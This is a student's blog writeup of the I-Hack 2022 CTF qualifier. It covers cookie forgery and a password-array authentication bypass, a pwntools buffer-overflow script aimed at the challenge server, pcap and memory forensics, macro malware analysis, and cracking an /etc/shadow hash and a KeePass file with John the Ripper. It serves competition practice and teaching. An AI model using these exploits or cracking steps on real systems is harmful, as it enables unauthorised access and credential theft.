---
id: 1
title: I-Hack 2022 Qualifier Round CTF Writeup
# image field is not mandatory
# you can skip it to keep the size of blog cards small
# image: https://images.unsplash.com/photo-1498050108023-c5249f4df085?ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&ixlib=rb-1.2.1&auto=format&fit=crop&w=3452&q=80
createdAt: "2023-03-30"
tags:
  - ctf
  - ihack22
  - cybersecurity
  - university
category: security
author:
  name: vicevirus
  image: /images/bigheadkarngyan.png
---

#  Introduction

The experience of participating in the I-Hack 2022 CTF qualifier round was a thrilling one for my team and me. As university students, we were eager to take on the challenge of this online event and test our skills against some of the brightest minds in the field of cybersecurity.
<!--more-->
The qualifier round of the CTF took place on the 10th of December 2022, and we were excited to join in and compete against other teams. The mode of the CTF was in jeopardy, which is a popular format for CTF events. In this format, teams are given a set of challenges to solve, with each challenge increasing in difficulty. The team that solves the most challenges and accumulates the most points within the time limit emerges as the winner.

The competition was intense, and we had to work hard to solve each challenge. With no decay mode, it was crucial to focus on solving as many challenges as possible and accumulating points. The pressure was high, but we were determined to do our best and secure a place in the top 20 teams that would move on to the final rounds of I-Hack.

After hours of solving challenges and competing against other teams, we were thrilled to learn that we had successfully secured the 7th place out of the 70-something participating teams in the final minutes of the CTF. It was an incredible feeling to see our hard work pay off and to know that we had earned a spot in the final rounds of I-Hack.

Overall, participating in the I-Hack 2022 CTF qualifier round was an unforgettable experience for my team and me. We learned a lot, tested our skills, and had a lot of fun along the way. We are excited to see what the final rounds of I-Hack have in store for us and look forward to the challenges that lie ahead.

Forgive me for the lack of images as during writing this writeup, it was done in a hurry.

##  Web Category
---
#### Web01
---
1. We were given a website where we could navigate to. Further inspection we found that the cookies is in **base64** format
2. Straightly, I decoded the **base64** and found that it converts to **user**.
![Base64](/images/ihackqual/ihackqual0.png)*Decoding and encoding to base64*  

3. I am using **postman** to alter my cookies and sending a HTTP request with the **base64** encoded text I've just copied from above.
![Cookies](/images/ihackqual/ihackqual2.png)*Changing cookies*  

4. and here is the flag!
![FlagWeb01](/images/ihackqual/ihackqual1.png)*Flag for web01*
<br><br>
#### Web03
---
1. Sending get request to the page and we could see the cookies value looks familiar. Looks like it's **base64**. And the password is set **biskutsedap**. Looks fishy to me...
![Cookies](/images/ihackqual/ihackqual3.png)*Cookies that looks like base64*  

2. Decode to **base64** two times and we found that we are logged in as **user**. Through my intuition, I changed the value **user** to **admin**
![base64decode](/images/ihackqual/ihackqual4.png)*Base64 decoding*  

3. After this we have an error saying incorrect password. So we change **password** cookie to **password[]** to try and bypass it.
![passwordtoemptyarray](/images/ihackqual/ihackqual5.png)*Changing password to an empty array*  

4. Then do a request again and you will the flag in html body!  
![FlagWeb03](/images/ihackqual/ihackqual6.png)*Found the flag for Web03!*  
<br>
## PWN Category
---
#### Pwn02
---
1. Check what kind of file is it and found it’s an **elf** file.  

2. We have seen this challenge somewhere before. We just edited the script we have used before, knowing we are working with a similar problem.  

```
from pwn import *
context.terminal = ["tmux", "splitw", "-h","-p","60"]
if args.SILENCE:
context.log_level="info"
else:
context.log_level="debug"

elf = ELF("./chal",checksec=False)
context.arch=elf.arch
gdb_script = """
b *echo+162
c
"""
if args.REMOTE:
p = remote("pwn2.ihack.sibersiaga.my",1389)
else:
p = elf.process(aslr=False)
if args.GDB:
gdb.attach(p,gdb_script)
offset=cyclic_find("iaaa")
payload=flat(
"A"*offset,
p32(elf.symbols["ZmxhZ2hlcmUh"])
)
p.sendlineafter("Enter some text:",payload)
p.interactive()
```
*script.py*

3. Run the command below and you will find the flag.
```
python3 script.py REMOTE
```
<br>

## DFIR Category
---
#### DFIR 1
---
1. For this challenge we were given a **.pcap** file. I used **networkmine** for this. With **networkmine** you could extract files from the **pcap** file. We inspected every html and php file and found the shell file.  
![FlagDFIR01](/images/ihackqual/ihackqual9.png)*Networkminer interface*  

2. The flag is in the **md5sum** of the shell file..
![FlagDFIR01](/images/ihackqual/ihackqual10.png)*Found the flag for DFIR 01!*

<br>

## Malware Analysis Category
---
#### DOCM
---

1. Used **oletools : olevba letter.docm** and you will find a **base64** looking text.

![Base64Text](/images/ihackqual/ihackqual11.png)*olevba letter.docm*  

2. Decode the **base64** using **CyberChef** and you will get a dotted text that resembles a link.  

![Link](/images/ihackqual/ihackqual12.png)*.ps1 link*  

3. Remove the dots from the link and you will get the flag!  

![FlagDocm](/images/ihackqual/ihackqual13.png)*Flag for DOCM*

<br>

## Memory Forensics
---
#### I
---
1. Find the **md5** of .vmem file. Use **md5** or **md5sum** command in Linux
![FlagI](/images/ihackqual/ihackqual14.png)*Flag for I, md5*

#### II
---
1. We realized of the tasks in this memory forensics could be done using **Volatility**. And sometimes its two flags in one!

2. Run this command below and you will get a lists of processes
![inspectMem](/images/ihackqual/ihackqual15.png)*Inspecting the memory with volatility*  

3. Found this **putty** process seems out of place.. and tried entering the flag with **putty.exe** and it works!  

![FlagMem01](/images/ihackqual/ihackqual17.png)

**Flag : ihack{putty.exe}**

#### III
---
1. It’s the continuation of the previous one. Just take the **PID 1732** and use it as flag. 
**Flag: ihack{1732}**

#### IV
---
1. We still use **Volatility** here but we change the parameters little bit.
![NetScan Volatility](/images/ihackqual/ihackqual16.png)

2. And we found the **IP address** used to connect through putty. That **IP address** is the flag. 

![NetScan Volatility](/images/ihackqual/ihackqual18.png)*This command will scan for the ports and networks in the memory.*  
  
**Flag : ihack{ip address}**
#### VI
---
1. This flag can actually be found on the previous parameters of network scan. **RDP** port is **3389**. We enter the IP that is using port **3389** as flag.

![Address of RDP](/images/ihackqual/ihackqual19.png)*IP Address of the RDP*
  
**Flag : ihack{ip address of the RDP service}**

<br>

## Cracking
---
#### AES
---
1. I used **file** command in Linux and the file is actually a salted openssl.
2. So what I did is I used, **bruteforce-salted-openssl** with wordlist **rockyou**. And we found the password. But it doesn’t end there.
![Password](/images/ihackqual/ihackqual20.png)*Cracked the password*  

3. We decrypt it with the password we got from bruteforcing
![Decrypt](/images/ihackqual/ihackqual21.png)*Decrypting the salted openssl*  

4. and we found the flag!
![FlagAES](/images/ihackqual/ihackqual22.png)*Flag AES*

### Password Recovery
---
1. This is an **/etc/shadow** file. The flag is encrypted with **yescrypt**
2. I’ve actually tried to unshadow first but turns out I was understanding it wrong.
3. Then I directly used **john the ripper** to bruteforce with **rockyou** wordlist using command below.
```
john –format=crypt –wordlist=/usr/share/wordlists/rockyou.txt unshadow.txt
```
4. After some time you could just use **john –show unshadow.txt** to see the decrypted password. **(iluvyou)**
![FlagPasswordRecovery](/images/ihackqual/ihackqual23.png)*Password recovered*  

5. Convert **iluvyou** to **md5** and you have the flag!

### Forgotten Password
---
1. Used **file** command on the password file. Found out it’s a **Keepass** password file.
2. Use the same kind of bruteforcing as before but little bit of a step.
3. First convert the file to hash using **keepass2john**
![Conversion](/images/ihackqual/ihackqual24.png)*.kdbx to hash text*  

4. Run bruteforcing as you would before with **rockyou.txt** on that hash. And you will find password **cristianoronaldo**
![Ronaldo](/images/ihackqual/ihackqual25.png)*Password found*  

5. It doesn’t end there. SIUUU.

6. Next, I installed **keepass** to open the **keepass** file. Then I entered the password we got just now. Now we could see everything inside and the FLAG!
![FlagKeepass](/images/ihackqual/ihackqual26.png)*Flag Forgotten Password*

## Thanks for reading my writeup!